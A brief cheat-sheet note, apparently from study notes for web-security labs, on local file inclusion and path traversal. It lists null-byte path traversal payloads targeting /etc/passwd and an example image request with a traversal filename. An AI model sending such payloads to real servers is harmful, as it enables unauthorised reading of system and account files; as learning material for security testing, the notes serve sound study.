# LFI
### Directory traversal | File path traversal
Replace LFI payloads:
../../../etc/passwd%00.png
to
../../../etc/passwd%00index.html
EJP:
```bash
/image?filename=25.jpg
```

```bash
/image?filename=../../../etc/passwd%00.png
```
